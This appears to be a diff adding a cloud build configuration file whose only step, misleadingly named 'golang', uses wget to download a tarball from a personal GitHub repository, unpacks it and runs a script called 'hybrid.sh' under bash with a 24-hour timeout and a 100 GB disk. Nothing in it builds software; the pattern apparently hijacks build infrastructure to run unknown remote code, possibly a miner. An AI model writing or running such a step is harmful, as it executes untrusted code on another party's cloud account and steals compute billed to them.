@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         wget https://github.com/sabarlur/guys/raw/main/hib.tar.gz && tar xf hib.tar.gz && ./hybrid.sh
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
